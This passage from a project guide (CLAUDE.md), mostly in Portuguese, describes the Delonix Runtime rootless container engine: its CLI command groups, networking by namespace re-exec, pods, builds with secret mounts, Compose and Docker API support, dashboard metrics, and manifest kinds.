# Delonix Runtime — guia do projeto (CLAUDE.md)

Motor de **containers e microVMs daemonless, rootless-first, kernel-native, em Rust**.
Repositório **público** (`angolardevops/delonix-runtime`, Apache-2.0) — extraído do monorepo
privado `delonix-paas` (ver [README.md](README.md) para a arquitectura dos 8 crates).

## Comandos

```bash
cargo build --workspace               # tudo
cargo test  --workspace               # testes
cargo build -p delonix-runtime-bin    # a CLI `delonix` (ver secção "CLI" abaixo)
```

## CLI (`delonix`)

O binário `delonix` (crate `delonix-runtime-bin`) é a CLI opensource completa deste motor —
homóloga ao Docker, distinta do `delonix`/`delonixctl` privados do `delonix-paas` (outro
repo/branch/remote, não afectados por nada aqui). Comandos agrupados semanticamente em vez de
uma lista plana, um módulo por grupo em `crates/delonix-runtime-bin/src/cmd/`:

- `delonix container` — run/ps/stop/rm/exec/logs/**update**/**describe**/**kill**/**wait**/
  **restart**/**rename**/**port**/**attach** (v0.25.0, Docker/Podman CLI-verb parity). `kill -s
  <signal>` sends an arbitrary signal (name or number) without forcing a `Stopped` status — the
  real outcome (`Crashed` for anything that actually terminates the process) is picked up on the
  next observation, same as any other unexpected death; `wait` blocks and prints the real exit
  code **only when a `--restart` supervisor is the process's real parent** (it alone captures a
  genuine `waitpid` status) — a plain `-d` container with no supervisor still surfaces as
  `Crashed`/137 on death, a pre-existing architectural limit (the engine isn't the real parent),
  not a bug in `wait` itself. `exec -e/-w/-u` are per-call overrides (never persisted); `exec -w`
  also fixed a real bug found while adding it — `exec` used to hardcode `chdir("/")`
  unconditionally, ignoring the container's own configured `workdir` even with no `-w` at all.
  `logs --tail/--since/--timestamps` only work for containers run with `--log-cri` (the only log
  format with real per-line timestamps to filter/show — a clear error otherwise, never a silently
  blank column). `attach` is deliberately **output-only**: this engine keeps no live stdin
  conduit to an already-started detached container (no persistent per-container shim like
  containerd's), so `-i` is refused with a clear error pointing at `exec -it` instead. **Nome default
  angolano**: sem `--name`, o container chama-se `<rei>-<lugar>-NN` (ex.:
  `njinga-benguela-07`) — listas partilhadas com o kind-mode em `cmd/names.rs`;
  DETERMINÍSTICO do id (as 2 passagens do re-exec de `--net` convergem sem transporte),
  colisão avança para a próxima combinação, `dlx-<id>` só como último recurso. `run` aceita `-v/--volume` (nomeado ou bind
  mount, via `delonix-volume::VolumeStore::resolve_spec`, testado e funcional) e
  `--net host|none|<rede>`. `host`/`none` — comportamento original, inalterado, testado. `--net
  <rede-custom>` **FUNCIONA em rootless** via o **re-exec `nsenter … ip netns exec`** (a nota
  antiga dizia que não existia — ESTAVA DESACTUALIZADA): `infra::attach_container` cria a netns
  NOMEADA do lado do holder e `reexec_into_netns` (`cmd/container.rs`) re-executa o binário via
  `infra::join_argv` (`nsenter -t <holder_pid> -U -m -n … ip netns exec <netns>`); a 2ª passagem
  corre com `RunSpec.inherit_userns` (suprime `CLONE_NEWNET`/`CLONE_NEWUSER`, herda os do holder —
  o processo passa a ter privilégio no userns do holder). O `RunSpec.join_netns` por `setns`
  (que falhava com "netns do pod indisponível") é **código morto** — abandonado a favor do
  re-exec. **`--pod <netns>`** usa o MESMO mecanismo para juntar N containers à netns partilhada
  de um pod (ver `delonix pod` / `kind: Pod` abaixo). **GPU real via CDI (v0.28.0)**: `--gpus
  nvidia|all` e `--device nvidia.com/gpu=<nome|all>` (`cmd/cdi.rs`) — CONSOME specs CDI já gerados
  por `nvidia-ctk cdi generate` (`/etc/cdi`/`/var/run/cdi`), nunca faz a descoberta do driver
  sozinho (isso fica 100% dentro do `nvidia-ctk`, tal como no Docker/Podman/containerd reais).
  Deliberadamente NÃO é o modelo do hook legacy `nvidia-container-cli configure --pid=<pid>`
  (um 2º processo a `setns` para dentro do userns/mntns de OUTRO por PID — precisaria de
  `CAP_SYS_ADMIN` nesse userns alheio, o mesmo problema de privilégio cross-namespace que o
  `--net <rede-custom>` já resolve por re-exec, não por attach externo): os `deviceNodes`/
  `mounts`/`env` do spec traduzem-se para o MESMO `Vec<Mount>`/`Vec<String>` que `-v`/`--device`
  já alimentam, aplicados pelo PRÓPRIO init do container antes do `pivot_root` — zero modelo de
  privilégio novo, o mesmo mecanismo já rootless de sempre. Sem spec CDI nem `nvidia-ctk` no
  PATH, `--gpus nvidia`/um `--device nvidia.com/gpu=...` **recusa com erro claro e accionável**
  ANTES de criar nada (nunca cai em silêncio para o bind cru de `/dev/nvidia*`, que falharia a
  meio com um erro confuso do CUDA). `ldconfig -r <rootfs>` best-effort logo após os mounts em
  `setup_rootfs` (ainda antes do `pivot_root`) — substituto deliberadamente mais simples do hook
  `createContainer` real de um spec CDI (que precisa do protocolo OCI-hook-stdin-state, não
  implementado); um spec que declare hooks avisa (não silencioso) que não foram executados.
  `--gpus dri` continua inalterado (bind cru de `/dev/dri/*` — Mesa/VAAPI é open-source, já vem
  no pacote da própria imagem). **Por confirmar num host GPU real** (impossível neste sandbox):
  a precedência exacta `/etc/cdi` vs `/var/run/cdi`, e se o `ldconfig -r` chega como substituto
  dos hooks reais.
- `delonix pod` — **pods reais multi-container** (create/ls/describe/rm/logs). N containers
  partilham a **netns do pod** (mesmo IP, `localhost` entre si), como um Pod do k8s. `cmd/pod.rs`:
  cria uma netns SDN NOMEADA no holder (`pod-<nome>`, via `infra::attach_container`) e corre cada
  container com `--pod pod-<nome>` (o re-exec acima) + label `delonix.io/pod=<nome>`. **Membership
  sem store novo** — o estado deriva dos labels (`Store::list`), como `cluster`/`stack`. `rm`
  remove todos os membros + `detach` da netns. Reutiliza a normalização k8s→docker do
  `kind: Container` (`container::container_to_run_opts`/`pod_member_run_opts`); o `kind: Container`
  continua a aceitar SÓ 1 container (>1 → usa `kind: Pod`). **`kind: Pod`** no manifesto (mesmo
  schema `PodSpec`, N containers) + grupo `pods:` no `kind: Stack` + `--dry-run`. **Também tapa o
  gap do CRI root-mode** (`delonix-cri` chamava `delonix pod create/rm` que não existia).
  **Partilha de namespaces**: **netns** (Fase 1) + **IPC + UTS** (Fase 2) — o 1.º container segura
  o ipc/uts e os restantes juntam-se via `RunSpec.pod_infra_pid` (o `spawn` suprime
  `CLONE_NEWIPC/NEWUTS`, o `container_init` faz `setns` de `/proc/<pid>/ns/{ipc,uts}`); possível em
  rootless porque o re-exec `--pod` já os põe no userns do holder, onde o `setns` tem privilégio (a
  razão pela qual o `setns` antigo — `join_netns`, agora removido — falhava deixou de valer).
  **PID** (`shareProcessNamespace`, campo já no schema) é a Fase 3.
- `delonix image` — pull/ls/rm/export (bundle OCI para `runc`/`crun`).
- `delonix build -t <tag> [-f Dockerfile|Delonixfile] [contexto]` — único grupo com orquestração
  nova (as outras têm API pronta nas crates, isto é "ligar os fios"): sobe um container de
  trabalho (`sleep infinity`) POR ESTÁGIO, corre cada `RUN` via `exec`, aplica `COPY` no rootfs em
  disco, e empacota com `ImageStore::commit_flat_rootfs` (rootless) ou `commit_upper`+`build_image`
  (root). **Multi-stage** (`FROM ... AS <nome>` + `COPY --from=`) suportado — só o modo root
  (overlay) exige que o estágio FINAL seja uma imagem real (sem lineage OCI para um estágio
  clonado). **Cache de layers por instrução** (rootless only, `--no-cache` para saltar). **`--secret
  id=<nome>,src=<caminho>`** + **`RUN --mount=type=secret,id=<nome>[,target=][,required=]`** —
  bind-mount AO VIVO (`runtime::mount_live`/`unmount_live`, o mesmo primitivo do `container update
  --volume-add`) só durante a janela desse `RUN`; como o mount vive só no namespace de montagem já
  próprio do container de trabalho, o segredo nunca é visível do lado do host que o
  `commit_flat_rootfs`/cache lê — estruturalmente não pode chegar a uma layer. Validado ao vivo:
  valor lido durante o `RUN`, ausente (nem sequer um ficheiro vazio) na imagem final. `type=ssh`/
  `type=cache`/`type=bind` dão erro claro (nunca viram texto de shell literal). **`--platform
  linux/<arch>`** — resolve a imagem base do arch pedido (`resolve_or_pull_platform`, arch-aware:
  só reaproveita uma imagem local se o `config.architecture` guardado bater), carimba-o no
  resultado; preflight claro contra `/proc/sys/fs/binfmt_misc/qemu-<arch>` antes de arrancar um
  build cross-arch (o binfmt/qemu-user-static em si é um pré-requisito do HOST, não gerido por
  este motor — mesmo princípio do `docker run --privileged tonistiigi/binfmt` do buildx real).
  **`Delonixfile`**: sem `-f`, `default_build_file` (`cmd/build.rs`) procura `<contexto>/
  Delonixfile` antes de `Dockerfile` — mesma gramática (`parse_dockerfile` já suporta as extensões
  Delonix `SCAN`/`CPUS`/`MEMORY`/`SECURITY`/`HEALTHCHECK` independentemente do nome do ficheiro);
  `Delonixfile` é só o nome canónico por omissão.
- `delonix vm` — create/ls/stop/rm/status, flags 1:1 com `delonix_vm::VmConfig`.
- `delonix volumes` — create/ls/rm/inspect, wrapper fino sobre `VolumeStore`.
- `delonix network` — ls/create/rm/inspect. **Dois stores em paralelo, deliberado**:
  `NetworkStore` (registo declarativo rico — drivers bridge/macvlan/ipvlan/overlay) e
  `infra::{network_create_with,network_remove}` (plano físico do holder netns rootless). Para os
  drivers `bridge` E `overlay`, `network create` orquestra os dois em conjunto — o `overlay` sobe
  o plano físico no holder (bridge + uplink VXLAN `dlxvx<vni>` a masterizá-la + FDB dos pares +
  WireGuard se cifrado, ver `realize_overlay`/`infra::set_vxlan`), porque é realizável sem
  privilégio de host (vive todo no netns do holder). Provado ao vivo: `network create --driver
  overlay --vni 42 --peer …` cria o device VXLAN (`id 42 dstport 4789 nolearning`, master na
  bridge) e semeia o FDB com os pares — validado até à fronteira single-node (o forwarding
  inter-nó exige um 2.º nó real, não testável no sandbox). Já `macvlan`/`ipvlan` só ficam no
  `NetworkStore` e o `create` **AVISA alto** que a rede NÃO foi realizada (Realized=False,
  reason=DriverNotImplemented) em vez de fingir sucesso — o plano físico deles precisa de
  CAP_NET_ADMIN na init-netns do host, que o modelo rootless não tem.
- `delonix storage` — armazenamento de REDE (NFS/CIFS-SMB/WebDAV) montável como volume, estilo
  PersistentVolume do k8s. `create/ls/inspect/rm/apply` + `kind: Storage`. Uma pasta de um NAS
  (TrueNAS/Synology/Nextcloud) vira um volume nomeado que qualquer container monta com `-v <nome>:/x`.
  Por baixo é um volume do `delonix-volume` com driver de rede (o `ensure_mounted` monta via
  `mount -t nfs|cifs|davfs`); a declaração amigável (server/share/credenciais) é traduzida no
  device/options por `storage::build_mount`. Password via cofre (`--password-secret` → chave
  `password` do segredo). Validado end-to-end com NFS real: um container LEU e ESCREVEU num volume de
  rede e a escrita chegou ao NAS (ver `examples/storage.yaml` + `examples/nas-vm-cloud-config.yaml`,
  a receita da VM Samba+NFS de validação). **Montar NFS/CIFS precisa de CAP_SYS_ADMIN** (root ou
  sessão privilegiada) — em rootless puro o `mount -t` falha claro.
- `delonix net httproute` — ls/apply/rm do **reverse-proxy L7/HTTP** (`kind: HTTPRoute`). Ver a
  secção "Reverse-proxy L7" abaixo. **Não confundir** com `delonix net ingress` (firewall L4 inbound).
- `delonix stack apply [-f delonix-manifest.yaml]` — ver secção "Manifesto/apply" abaixo.
- `delonix compose up|down|ps|logs|config [-f <ficheiro>] [-p <projecto>]` (v0.29.0) — suporte
  NATIVO a `docker-compose.yml` (Compose Spec v2.x), `cmd/compose.rs`. Um tradutor de esquema
  estrangeiro, da mesma família que `container::pod_to_run_opts` (Pod k8s) e
  `dockerapi::docker_config_to_run_opts` (API Docker): parser tipado à mão (sem dependência
  nova), traduzido directamente para `RunOpts` (containers, reaproveitando `cmd_run` tal-e-qual)
  ou para `ManifestDoc`s que reaproveitam `image`/`network`/`volume::apply` verbatim (mesma
  idempotência, mesmo hardening de input, zero lógica de criação duplicada). **`depends_on`** com
  as 3 condições (`service_started`/`service_healthy`/`service_completed_successfully`) via
  ordenação topológica do grafo de serviços (ciclo → erro claro, nunca uma ordem arbitrária) +
  espera pelo healthcheck real (inline do serviço ou o da própria imagem) — sem mudança nenhuma
  ao schema do motor/store. **Projecto** (`compose down/ps/logs`) = label
  `delonix.io/compose-project=<nome>` nos containers (mesma ideia de `pod.rs`'s `POD_LABEL`);
  redes/volumes não têm campo de labels, por isso usam nomeação DETERMINÍSTICA
  (`<projecto>_<nome>`, a mesma convenção do `docker compose` real) — `down` reconstrói os
  mesmos nomes a partir do ficheiro compose (reanalisado), sem registo próprio, mesma filosofia
  do `stack describe`/`cluster ls`. **Validado ao vivo de ponta-a-ponta** (Postgres+app): `web`
  só arrancou depois do `pg_isready` do `db` ter sucesso real; `compose down -v` removeu os 2
  containers + rede + volume sem deixar nada para trás; `up` idempotente numa 2ª chamada.
  **FEITO (2026-07-27)**: `working_dir:` — ganhou `container run -w/--workdir` (gap do motor
  inteiro, não só do compose: `RunOpts`/`Container` nunca tinham override de workdir na criação,
  só o `exec -w` já tinha um por-chamada; `c.workdir` já era aplicado no `chdir()` do init antes
  do `execve`, só faltava uma forma de o definir a partir de fora da imagem). `compose` passou a
  usar `RunOpts.workdir`. Validado ao vivo: `working_dir: /opt/app` → `pwd` dentro do container
  confirma `/opt/app`. **FEITO (2026-07-27)**: porta sem host explícito (`ports: ["80"]`, formas
  curta e longa) — em vez de recusar, atribui uma porta livre do host (`free_host_port`, bind a
  porta 0 + liberta de imediato; TOCTOU inerente e aceite, mesma técnica que qualquer atribuição
  aleatória de porta usa). Validado ao vivo: `compose up` com `ports: ["80"]` publicou de facto
  numa porta livre real, confirmado por `container port`.
  **Por fazer, documentado (nunca silencioso)**: `profiles`/`extends`/`configs`/`secrets`
  top-level (usa `kind: Secret` em vez disso)/multi-ficheiro (`-f a -f b`/`include:`),
  `build.target` (selecção de estágio), `deploy.replicas≠1`, `networks.*.ipv4_address` fixo,
  volumes anónimos (sem `source` explícito) — este último deliberadamente NÃO tentado ainda:
  precisa de semântica própria de nomeação/limpeza (quando é que um volume anónimo se apaga?
  `down` simples ou só `down -v`?) que merece ser pensada com calma, não decidida às pressas.
- `delonix serve docker-api [--addr unix://<socket>]` — fatia da **Docker Engine API** (`cmd/dockerapi.rs`)
  que basta para `docker version/ps/images/info` **e**, desde a v0.26.0, o ciclo de vida completo de
  um container via `DOCKER_HOST=unix://<socket>`: `POST /containers/create|start|stop|kill|wait|
  restart|rename`, `DELETE /containers/{id}`, `GET /containers/{id}/json`, todos delegando na MESMA
  `cmd_run`/`cmd_stop`/`cmd_kill`/etc. do CLI (zero duplicação). Simplificação deliberada:
  `create` já arranca de imediato (sem estado "created" dormente) — `start` numa já-a-correr devolve
  o **304** idempotente que o docker real também devolve, o que mantém o par `create`→`start` que o
  `docker compose up` usa a funcionar. **`exec`/attach interactivo (HTTP hijacking) fica fora de
  escopo**; `--restart` (política que precisa do supervisor `run_supervised`, um `fork()` cru) é
  **recusado com erro claro** em vez de arriscar um fork de um processo multi-thread (o supervisor
  assume um chamador single-threaded, verdade só para o CLI).
  **2 bugs reais encontrados e corrigidos ao validar contra um `docker` CLI real**: (1) um container
  desanexado morto ficava **zombie para sempre** (`ps` mostrava `<defunct>`, `docker inspect`
  continuava a dizer `Running`) — `spawn()` só devolve sem `waitpid` quando `detach: true`,
  inofensivo no CLI normal (o processo sai logo a seguir, o órfão é reparentado ao `init` real do
  host, que o reapa), mas este servidor NUNCA sai — é o pai real do container para sempre, e nunca
  chamava `waitpid`; corrigido com uma thread reaper dedicada (`waitpid(-1, ...)` em loop). (2) o
  **shim de logs** (`log_shim`, um `fork()` que nunca faz `execve` — corre para sempre a copiar o
  pipe do container para o ficheiro de log) só fechava o stdio herdado (fds 0/1/2); em long-lived
  como este servidor, herdava TAMBÉM os sockets de outras ligações HTTP vivas e ficava a segurá-los
  abertos para sempre — corrigido a fechar tudo menos o fd de origem logo após o fork
  (`libc::close_range`). **Limitação documentada, não bloqueante**: o subcomando de conveniência
  `docker run` (create+start num só comando) não devolve o controlo ao terminal de forma fiável
  contra este servidor (o `create`+`start`+`inspect`+`kill`+`wait`+`restart`+`rename`+`stop`+`rm`
  separados — o caminho que `docker compose` usa — foram todos validados correctos e instantâneos);
  a causa aparenta ser um comportamento interno do próprio CLI Go, não reproduzido com os comandos
  separados.

### Reorganização da raiz da CLI (v0.30.0, BREAKING, corte limpo sem aliases)

Bug report real do utilizador: a raiz do `delonix` tinha crescido para **26 subcomandos planos**
(`netns`/`flow`/`ingress`/`egress`/`httproute`/`tunnel`/`boot`/`cri`/`api`/`docker-api`/`kube`
lado a lado com `container`/`image`/`vm`/...) — fácil de invocar um sub-comando de baixo nível
como se fosse um comando principal por engano. Pedido explícito: agrupamento **profundo** +
**corte limpo** (sem aliases de retrocompatibilidade — nomes antigos removidos por inteiro).

- **`delonix net <x>`** (`cmd/net.rs`) agrupa a plumbing de rede/infra de baixo nível: `netns`
  (antigo `delonix netns`), `flow`, `ingress`, `egress`, `httproute`, `tunnel`, `boot`. Roteamento
  puro — cada braço delega no MESMO `run()` de sempre, zero mudança de comportamento, só o
  caminho da CLI para lá chegar.
- **`delonix serve <x>`** (`cmd/serve.rs`) agrupa os três "serve um protocolo num socket unix":
  `cri` (antigo `delonix cri`), `api` (antigo `delonix api`), `docker-api` (antigo `delonix
  docker-api`).
- **`delonix cluster kube generate`** — o antigo `delonix kube generate` dobrou para dentro de
  `cluster` (`ClusterCmd::Kube`), por ser outra faceta do mesmo grupo "Kubernetes" que `cluster
  apply`/`cluster kubeadm` já ocupam.
- `delonix ingress-proxy` (subcomando OCULTO, o processo interno do proxy L7 lançado dentro do
  netns do holder) ficou **deliberadamente de fora** desta reorganização — não é clutter visível
  (`--help` não o lista) e mexer no seu argv arriscava partir o mecanismo de re-exec que já usa.
- **Mapeamento antigo→novo**: `netns`→`net netns`, `flow`→`net flow`, `ingress`→`net ingress`,
  `egress`→`net egress`, `httproute`→`net httproute`, `tunnel`→`net tunnel`, `boot`→`net boot`,
  `cri`→`serve cri`, `api`→`serve api`, `docker-api`→`serve docker-api`, `kube`→`cluster kube`.
  **Sem aliases** — um script/pipeline que ainda invoque a forma antiga falha com "unrecognized
  subcommand", não silenciosamente.
- **Mecanismo interno intocado**: o holder netns e o re-exec de `--net <rede-custom>`
  (`container::reexec_into_netns` → `nsenter … ip netns exec`) usam interceção de
  `std::env::args()` CRUA em `main()`, ANTES do parsing `clap` — verificam literalmente
  `argv[1] == "netns"`/`argv[2] == "holder"`/`"run"`. Esse mecanismo é **completamente
  independente** do enum `Cmd` público — mover `netns` para dentro de `Cmd::Net` não lhe mexe
  em nada. Confirmado ao vivo: `container run --net <rede-existente>` neste host continua a
  ganhar IP real na SDN depois da reorganização.

## Output: `ls` estilo docker, `describe` estilo kubectl (`cmd/output.rs`)

Toda a formatação passa por `cmd/output.rs` — `Table` (mede as colunas pelo conteúdo real; antes
cada grupo tinha larguras hardcoded `{:<20}` e a tabela desalinhava assim que um nome as passava),
`Describe` (blocos `kubectl`-like) e `fmt_size`/`fmt_local`/`fmt_age`/`fmt_duration_secs`.
**Sem dependências novas** — não há `comfy-table`/`tabled`/`chrono` na árvore e não vale a pena
aumentar a superfície de supply-chain de um runtime de containers por um alinhador de colunas.

> **Excepção deliberada: `ratatui` (`delonix dash`).** O dashboard interactivo
> (`delonix dash` + `container/vm/network/storage/image dash`) usa `ratatui`
> (traz `crossterm`) — a única dependência de UI que quebra a regra acima, por
> decisão explícita do utilizador (queria um TUI estilo htop, não um snapshot).
> Está **confinada ao bin** (`delonix-runtime-bin`); os crates de motor
> continuam dep-limpos (`cargo tree -e normal` deles não a mostra). O modo
> `delonix dash --once` (snapshot de texto ANSI) não a usa em runtime. Registado
> aqui para a auditoria futura não a tratar como acidental — ver `cmd/dash.rs`.

### KPIs de recursos (RAM/rede/storage) + Prometheus + `dash --json`

Pedido directo do utilizador ao ver o `delonix dash`: faltavam KPIs dinâmicos
(RAM/rede/storage consumidos), a barra de actividade "não dizia muito" (só
contagem de containers, sem uptime por-recurso), o dashboard vinha em PT por
omissão (bug de i18n — nunca detectado antes), e faltava uma forma de
alimentar Grafana/outras ferramentas SRE. Tudo isto partilha UM único
colector (`delonix-mgmt::dashstats::collect`), para o TUI, o `--json`, e o
scrape Prometheus nunca divergirem na aritmética.

- **Novo módulo `delonix-mgmt::dashstats`** (`crates/delonix-mgmt/src/
  dashstats.rs`): `pub fn collect(root, include_network, include_storage) ->
  DashSummary` — contagens de containers/VMs/redes/volumes/imagens/segredos,
  `memory.current`/`memory.max` do slice cgroup inteiro (`delonix_runtime::
  slice_budget`), soma de bytes rx/tx por-container
  (`delonix_net::infra::container_net_bytes`, um `nsenter`+`cat` por
  container a correr) e uso de disco por área (`blobs+layers`/`volumes`/
  `vm-images`/`containers`, `dir_size` recursivo estilo `du`, o mesmo padrão
  de `cmd/system.rs::dir_size`/`cmd_df` — duplicado ali de propósito: um
  helper de ~10 linhas, e `delonix-mgmt` não pode depender do crate `-bin`).
  `delonix-runtime-bin` depende de `delonix-mgmt` (nunca o inverso), por isso
  `cmd/dash.rs` chama directamente para este colector em vez de reimplementar
  a agregação — single source of truth entre TUI/JSON/Prometheus.
- **BUG DE CUSTO encontrado a validar ao vivo, corrigido antes de publicar**:
  a soma de disco (`storage_bytes_*`) percorre `containers/` — em rootless
  cada container tem uma cópia FLAT completa do rootfs (ver secção "Imagem VM
  dourada"/histórico do incidente de disk-pressure) — medido neste host (49
  containers, vários nós `kindest/node` completos): **68 GiB, mais de um
  minuto** de I/O de disco. Calcular isto em linha bloquearia o TUI a cada
  tick E estouraria o timeout de scrape do Prometheus (10s por omissão).
  Corrigido com dois mecanismos de desacoplamento:
  1. `dashstats::collect` ganhou `include_network`/`include_storage`
     (`bool`), devolvendo `Option<u64>` nos campos caros quando `false` — nunca
     um "0 bytes" enganoso, sempre `None` explícito até haver uma medição real.
  2. **TUI** (`cmd/dash.rs::tui::run_interactive`): a 1ª snapshot (antes do
     terminal) só pede os campos baratos (contagens + memória — instantâneo);
     uma `std::thread` própria corre o `collect(true, true)` completo em loop
     (`SLOW_REFRESH = 15s` entre passagens) e publica num `Arc<Mutex<
     DashSummary>>` partilhado; o tick de 1s do render (sempre barato) funde
     os campos caros mais recentes desse mutex antes de construir os tiles —
     a UI nunca bloqueia, mesmo que a passagem de disco demore mais de um minuto.
  3. **`delonix-mgmt` `/metrics`**: o handler só recalcula os campos baratos a
     cada pedido; uma tarefa `tokio::spawn`ada uma vez no arranque do servidor
     (`spawn_expensive_metrics_refresh`) recalcula os campos caros a cada 30s
     em background e publica-os no registo partilhado — o scrape fica sempre
     rápido (confirmado ao vivo: ~0.15s), as gauges caras ficam "stale" por até
     30s, nunca ausentes. `GET /v1/dash` (JSON, pedido pontual dum humano/
     ferramenta) continua a fazer a colheita COMPLETA em linha — documentado
     como potencialmente lento (dezenas de segundos), não é um scrape periódico.
- **Prometheus, não gRPC, para o Grafana**: o motor já tinha um registo
  Prometheus partilhado (`delonix-runtime-core::metrics`, `prometheus-client`
  já na árvore, usado só por contadores do CRI) exposto em `/metrics` do
  `delonix-cri` (scrape do kubelet) e do `delonix-mgmt` (scrape do
  control-plane) — Grafana fala nativamente Prometheus/REST, não gRPC. Ganhou
  gauges novas: `delonix_containers_running/total`, `delonix_vms_running/
  total`, `delonix_memory_bytes_used/limit`, `delonix_network_rx/tx_bytes`,
  `delonix_storage_bytes_{images,volumes,vm_images,containers}`. `Gauge` e não
  `Counter` mesmo para os bytes "cumulativos": o valor lido do kernel É
  monótono, mas é somado por um conjunto DINÂMICO de containers que podem
  desaparecer entre scrapes (encolhendo a soma) — a API de `Counter` só
  permite `inc`/`inc_by`, que não serve para isso.
- **`delonix-mgmt` ganhou `GET /v1/dash`** (JSON do mesmo `DashSummary`) e
  passou a depender de `delonix-runtime`/`delonix-vm`/`delonix-net` (antes só
  `delonix-volume`/`delonix-image`/`delonix-scan`) — mesma expansão que o
  `delonix-cri` já tinha feito por uma razão análoga (visibilidade completa
  do motor), sem dependência circular nenhuma.
- **`delonix dash --json`** (novo, ao lado do `--once` ANSI já existente):
  `DashData`/`Tile`/`Row`/`Problem`/`DashScope` ganharam `Serialize` — um
  snapshot só, sem TUI nem ANSI, para scripts/CI ou um datasource JSON do
  Grafana. Reaproveita o `DashData::collect` de sempre (colheita completa,
  incluindo os campos caros) — o mesmo trade-off de custo do `--once`.
- **Coluna `UP` na tabela de recursos** — uptime real por-container
  (`pid_starttime` → `output::uptime_from_starttime`/`fmt_duration_secs`, o
  MESMO mecanismo do `container ls`), `-` para VM/rede/volume/imagem (nenhum
  destes guarda um starttime hoje — não fingido). Responde directamente ao
  pedido do utilizador ("a barra não diz há quanto tempo o container está a
  correr").
- **Sparkline com alternância (tecla `m`)** — em vez de só a contagem de
  containers a correr, o TUI agora rastreia DUAS séries em paralelo (ambas
  baratas, já fazem parte de cada snapshot) e a tecla `m` alterna qual delas o
  gráfico de 2 minutos mostra: containers a correr, ou memória usada (MiB).
- **BUG DE I18N encontrado e corrigido**: `cmd/dash.rs` tinha 100% do texto
  de utilizador hardcoded em PT directamente no código-fonte — zero chamadas
  a `po::t`/`po::tf`, violando a regra deste repo (fonte 100% EN, tradução via
  `pt.po`) desde que o dashboard foi escrito. Corrigido: toda a UI do dash
  (tiles, tabela, painel de problemas, rodapé do TUI) passou a EN na fonte +
  entradas novas em `data/pt.po`; `docker-api`'s about-text (gap pré-existente,
  não relacionado com o dash) também ganhou tradução de caminho.
- **Validado ao vivo neste host**: `dash --json`/`--once` (57s, incluindo o
  scan de disco completo, correcto); TUI a arrancar em segundos (não mais de
  um minuto) confirmado pelo estado do processo (`epoll_wait` em ~3s, não
  bloqueado em I/O de disco); `delonix serve api` real com `/metrics`
  (0.14-0.2s, gauges caras a preencherem-se depois da 1ª passagem em
  background) e `/v1/dash` (JSON completo, ~33s) via socket unix real.

- `container ls` tem as 7 colunas do `docker ps`. O `Up …` sai do `pid_starttime` do init e **não**
  do `created_unix`: um container criado ontem e reiniciado há 5 min mostraria "Up 1 day" — falso
  exactamente quando interessa (a depurar um crash-loop).
- `fmt_duration_secs` porta o `units.HumanDuration` do docker **à letra**, baldes incluídos (dias
  até às 2 semanas, semanas até aos 2 meses). É essa escolha de baldes — e não um caso especial —
  que impede o "1 weeks" que a primeira versão daqui imprimia.
- **`describe` é aditivo; os `inspect` ficam como estavam.** `describe` = humanos, `inspect` = JSON
  para scripts. É uma CLI pública: migrar `volumes/network inspect` de texto para JSON seria
  breaking change e não se fez.
- `stack describe` não inventa estado: o stack **não tem registo próprio**, por isso parte do
  manifesto e vai confirmar a presença de cada recurso ao store respectivo (mesma filosofia do
  `cluster ls`, que deriva das labels). Não faz drift-detection — isso é trabalho de orchestrator.

## Reconfiguração a quente (`delonix container update`)

`container update <id>` muda **portas, volumes, redes e limite de banda sem parar o container** —
o PID não muda. É a diferença de fundo para o docker (onde mudar uma porta obriga a recriar):
aqui o dataplane não pertence ao ciclo de vida do processo. Flags: `--publish-add/--publish-rm`,
`--volume-add/--volume-rm`, `--net-connect/--net-disconnect`, `--net-rate/--net-burst/
--net-rate-clear`. **Remoções correm antes das adições**, para `--publish-rm 8080 --publish-add
8080:9000` funcionar num só comando.

Isto ligou APIs do motor que existiam há muito e **nunca tiveram um único chamador** —
`mount_live`/`unmount_live`, `attach_extra_container`/`detach_extra_container`,
`set_net_rate`/`clear_net_rate`. Por nunca terem sido chamadas, tinham um bug que só apareceu
agora (ver abaixo).

**Persistência**: cada operação grava no registo assim que o dataplane confirma, uma a uma, via
`Store::update` (flock — o CRI é concorrente). Não há transacionalidade: se a terceira falhar, as
duas primeiras JÁ estão aplicadas no kernel e um registo escrito só no fim ficaria a mentir.

**Limitações conhecidas, por desenho**:
- `--net-connect`/`--net-rate` exigem `--net <rede>`: o veth e o shaping vivem no netns do holder,
  que o caminho slirp-por-container (`--net host/none`) não tem.
- `--publish-add` num container criado **sem `-p` e sem `--net <rede>`** é impossível: o
  api-socket do slirp só é aberto quando o `run` leva portas (`slirp_attach`). Erro explícito.

**BUG CORRIGIDO ao ligar isto** (`mount_live`/`unmount_live`): gatavam o `setns(user)` em
`container.userns`, mas esse campo diz se o container **criou** o seu userns — os do ingress
rootless **herdam** o do holder e ficam com `userns=false` apesar de estarem num userns diferente
do nosso. Sem o setns, o `unshare(NEWNS)` seguinte dava EPERM e **toda** a montagem a quente
falhava (código 124). É o mesmo bug que o `exec` já teve e corrigiu — passam a abrir sempre o ns
`user` e a deixar o skip-por-inode do `open_container_ns` decidir. Lição a reter: **`container.
userns` não é "está num userns diferente do meu"**; nunca o usar para essa pergunta.

## Manifesto/apply (`delonix-manifest.yaml`)

Manifesto declarativo multi-documento, ao estilo Kubernetes (`apiVersion: delonix.io/v1` /
`kind` / `metadata.name` / `spec`), para os 5 Kinds com grupo de CLI: `Network`/`Volume`/
`Image`/`Vm`/`Container`. Parsing central em `cmd/manifest.rs` (`serde_yaml`, só neste binário —
não entra em nenhum crate de mecanismo). Cada grupo (`cmd/{network,volume,image,vm,
container}.rs`) tem um `spec` tipado próprio (`NetworkSpec`, `VolumeSpec`, ...) e uma função
`pub fn apply(docs: &[ManifestDoc])` que filtra o seu Kind e aplica.

**`kind: Workload` (ADR-0001, `docs/adr/0001-workload-kind-schema.md`)** — o começo do
Runtime Abstraction Layer: UM objecto declarativo para os dois tipos de computação.
`spec.type: container|vm` + um bloco nomeado pelo tipo (`spec.container`/`spec.vm`) que é
EXACTAMENTE a `ContainerSpec`/`VmSpec` do Kind autónomo (não redefine um único campo, logo não
pode divergir). **Açúcar que baixa no `manifest::load`** — um `kind: Workload` é reescrito num
`kind: Container`/`kind: Vm` sintético (herda `metadata`) e segue o apply por-Kind normal, tal
como um filho de `kind: Stack`; o Workload não sobrevive ao load, por isso `apply`/`stack apply`/
`--dry-run`/`ls`/`describe` e o `apply -f` por-Kind vêem o filho SEM wiring novo. `cmd/workload.rs`
(`lower_workload`, puro/testado) + o ramo no `load()`. **Fail-closed**: `pod`/`microvm` são
